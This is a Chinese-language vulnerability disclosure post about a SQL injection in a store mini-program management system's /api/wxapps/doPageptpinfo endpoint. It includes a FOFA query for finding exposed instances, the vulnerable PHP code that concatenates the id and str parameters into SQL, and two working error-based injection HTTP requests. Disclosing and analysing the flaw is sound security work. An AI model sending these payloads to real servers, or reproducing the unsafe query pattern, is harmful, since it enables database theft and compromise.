---
title: "万能门店小程序管理系统 /api/wxapps/doPageptpinfo SQL 注入漏洞"
source: https://mrxn.net/jswz/api-wxapps-doPageptpinfo-sqli.html
asset_dir: assets/万能门店小程序管理系统-apiwxappsdopageptpinfo-sql-注入漏洞
---

# 万能门店小程序管理系统 /api/wxapps/doPageptpinfo SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/15 18:17
- 474浏览
- [0评论](#comment)
- 20分钟阅读

深入探索

SQL

Web安全书籍

云安全解决方案

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/doPageptpinfo 存在 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。

SQL注入检测工具

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

application/api/controller/Wxapps.php

```
//拼团数据自己规格
    public function doPageptpinfo()
    {
        $uniacid = input("uniacid");
        $str = input("str");
        $types = input("types");
        $id = input("id");
        $arr = explode("/", $str);
        $where = "";
        foreach ($arr as $key => &$res) {
            $vv = $key + 1;
            $where .= " and type" . $vv . " = " . "'" . $res . "'";
        }
        $prefix = config('database.prefix');
        $proinfo = Db::query("SELECT * FROM {$prefix}wd_xcx_pt_pro_val WHERE pid = " . $id . $where . " limit 1");
        $baseinfo = Db::name('wd_xcx_pt_pro')->where('id', $id)->find();
        if ($baseinfo['thumb']) {
            $baseinfo['thumb'] = remote($uniacid, $baseinfo['thumb'], 1);
        }
        $adata['proinfo'] = $proinfo[0];
        if ($adata['proinfo']['thumb']) {
            $adata['proinfo']['thumb'] = remote($uniacid, $adata['proinfo']['thumb'], 1);
        }
        $adata['baseinfo'] = $baseinfo;
        $result['data'] = $adata;
        return json_encode($result);
    }
```

- **id 参数**： 该参数未作任何过滤或转义，直接作为 SQL 中 pid 的值拼接,造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。
- **str 参数中的各个分割后子串**： $str 经 explode("/") 拆分后，每个部分都以 “and type{n} = '用户输入'” 的形式拼接到 SQL 语句中,造成SQL注入漏洞。

# 漏洞复现

```
POST /api/wxapps/doPageptpinfo HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

id=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)%23
```

[![万能门店小程序管理系统 /api/wxapps/doPageptpinfo SQL 注入漏洞](images/img-001-a921769cb282.webp)](https://image.mrxn.net/ce17adb605b646ffb521c7f9a514f4eb.webp)

```
POST /api/wxapps/doPageptpinfo HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

str=a'+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)%23/b
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
